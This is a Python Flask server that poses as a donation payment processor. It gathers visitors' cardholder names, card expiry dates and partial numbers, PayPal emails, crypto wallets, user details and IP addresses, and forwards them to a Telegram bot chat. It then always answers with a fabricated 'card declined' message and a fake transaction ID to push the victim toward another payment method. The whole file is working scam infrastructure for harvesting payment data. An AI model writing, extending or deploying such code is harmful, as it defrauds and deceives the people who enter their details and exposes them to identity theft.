from flask import Flask, request, jsonify
import requests
from datetime import datetime
import random
import os
import logging
from logging.handlers import RotatingFileHandler
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)

# Configure logging
log_handler = RotatingFileHandler('payment_processor.log', maxBytes=100000, backupCount=3)
log_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler.setFormatter(formatter)
app.logger.addHandler(log_handler)

# Telegram Bot Settings
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

def validate_environment():
    """Validate required environment variables"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        raise ValueError("Telegram bot token and chat ID must be set in environment variables")

validate_environment()

def sanitize_input(input_data):
    """Basic input sanitization to prevent XSS"""
    if isinstance(input_data, str):
        return input_data.replace('<', '&lt;').replace('>', '&gt;')
    elif isinstance(input_data, dict):
        return {k: sanitize_input(v) for k, v in input_data.items()}
    elif isinstance(input_data, list):
        return [sanitize_input(item) for item in input_data]
    return input_data

def send_to_telegram(message):
    """Send message to Telegram bot with error handling"""
    if not message or len(message) > 4096:
        app.logger.error("Invalid message for Telegram")
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Telegram API error: {str(e)}")
        return False

def generate_transaction_id():
    """Generate realistic transaction ID"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_num = random.randint(1000, 9999)
    return f"TXN{timestamp}{random_num}"

def detect_card_type(card_number):
    """Detect credit card type with validation"""
    if not card_number or not isinstance(card_number, str):
        return 'UNKNOWN'
    
    card_number = ''.join(filter(str.isdigit, card_number))
    
    if not card_number or len(card_number) < 12:
        return 'UNKNOWN'
    
    first_digit = card_number[0]
    first_two = card_number[:2]
    first_three = card_number[:3]
    first_four = card_number[:4]

    if first_digit == '4':
        return 'VISA'
    elif first_two in ('34', '37'):
        return 'AMEX'
    elif 51 <= int(first_two) <= 55 or 2221 <= int(first_four) <= 2720:
        return 'MASTERCARD'
    elif first_four == '6011' or 644 <= int(first_four) <= 649 or first_two == '65':
        return 'DISCOVER'
    elif first_two == '35':
        return 'JCB'
    elif first_two in ('36', '38', '39') or 300 <= int(first_three) <= 305:
        return 'DINERS'
    return 'UNKNOWN'

def format_message(data):
    """Format the notification message"""
    amount = data.get('amount', '0')
    payment_method = data.get('payment_method', 'UNKNOWN').upper()
    ip_address = data.get('ip', 'UNKNOWN')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = [
        "🚨 NEW DONATION ATTEMPT 🚨",
        "",
        "📌 Basic Info:",
        f"💰 Amount: ${amount}",
        f"💳 Method: {payment_method}",
        f"🌐 IP: {ip_address}",
        f"🕒 Time: {timestamp}",
        f"📤 Method: {data.get('request_method', 'UNKNOWN')}",
        "",
        "👤 User Info:"
    ]
    
    user_info = data.get('user_info', {})
    if isinstance(user_info, dict):
        for key, value in user_info.items():
            message.append(f"🔹 {key}: {value}")
    else:
        message.append(f"🔹 User Info: {user_info}")
    
    message.extend(["", "💳 Payment Details:"])
    
    payment_details = data.get('payment_details', {})
    if payment_method == 'CARD':
        card_number = payment_details.get('card_number', '')
        message.extend([
            f"🔸 Card: {detect_card_type(card_number)}",
            f"🔸 Number: ****-****-****-{card_number[-4:] if len(card_number) > 4 else '****'}",
            f"🔸 Expiry: {payment_details.get('expiry', 'N/A')}",
            f"🔸 Name: {payment_details.get('name', 'N/A')}"
        ])
    elif payment_method == 'PAYPAL':
        message.append(f"🔸 Email: {payment_details.get('email', 'N/A')}")
    elif payment_method == 'CRYPTO':
        message.extend([
            f"🔸 Type: {payment_details.get('crypto_type', 'N/A')}",
            f"🔸 Wallet: {payment_details.get('wallet', 'N/A')}"
        ])
    
    message.extend(["", "⚠️ THIS IS JUST A RECORD - NO REAL PAYMENT WAS PROCESSED ⚠️"])
    
    return "\n".join(message)

@app.route('/api/process_payment', methods=['POST'])
def process_payment():
    try:
        app.logger.info(f"Request from {request.remote_addr}")
        
        # Get and validate request data
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        if not data:
            return jsonify({"error": "Invalid request data"}), 400
            
        data = sanitize_input(data)
        
        # Prepare notification data
        notification_data = {
            'amount': data.get('amount', '0'),
            'payment_method': data.get('payment_method', 'unknown'),
            'user_info': data.get('user_info', {}),
            'payment_details': data.get('payment_details', {}),
            'ip': request.remote_addr,
            'request_method': request.method
        }
        
        # Format and send message
        message = format_message(notification_data)
        if not send_to_telegram(message):
            app.logger.warning("Failed to send Telegram notification")
        
        # Return realistic error response
        error_responses = {
            'card': "Your card was declined. Please try another payment method.",
            'paypal': "We couldn't process your PayPal payment. Please try again.",
            'crypto': "Cryptocurrency payment failed. Please try another method.",
            'default': "Payment processing failed. Please try again later."
        }
        
        error_msg = error_responses.get(
            notification_data['payment_method'].lower(),
            error_responses['default']
        )
        
        return jsonify({
            'success': False,
            'message': error_msg,
            'error_code': 'PAYMENT_DECLINED',
            'transaction_id': generate_transaction_id(),
            'timestamp': datetime.now().isoformat()
        }), 400
        
    except Exception as e:
        app.logger.error(f"Processing error: {str(e)}", exc_info=True)
        return jsonify({
            'success': False,
            'message': "An unexpected error occurred",
            'error_code': 'SERVER_ERROR'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
